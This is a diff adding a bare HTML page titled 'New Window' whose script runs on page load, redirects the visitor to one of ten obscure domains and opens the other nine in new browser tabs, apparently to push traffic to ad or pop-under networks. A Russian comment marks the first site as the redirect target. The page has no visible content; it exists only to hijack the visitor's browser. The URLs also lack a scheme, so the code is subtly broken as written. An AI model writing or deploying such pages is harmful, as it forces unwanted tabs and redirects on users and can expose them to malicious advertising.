@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>New Window</title>
+  <script>
+    window.onload = function() {
+      var sites = [
+        'ookroush.com/4/6210188',
+        'dukingdraon.com/4/6210186',
+        'eptougry.net/4/6210184',
+        'shulugoo.net/4/6210182',
+        'woafoame.net/4/6210181',
+        'doruffleton.com/4/6210180',
+        'potskolu.net/4/6210179',
+        'dukingdraon.com/4/6210177',
+        'atservineor.com/4/6210176',
+        'nabauxou.net/4/6195739'
+      ];
+      
+      var mainSite = sites.shift(); // Первый сайт для редиректа
+      
+      window.location.href = mainSite;
+      
+      for (var i = 0; i < sites.length; i++) {
+        var site = sites[i];
+        var newTab = window.open(site, '_blank');
+      }
+    }
+  </script>
+</head>
+<body>
+</body>
+</html>
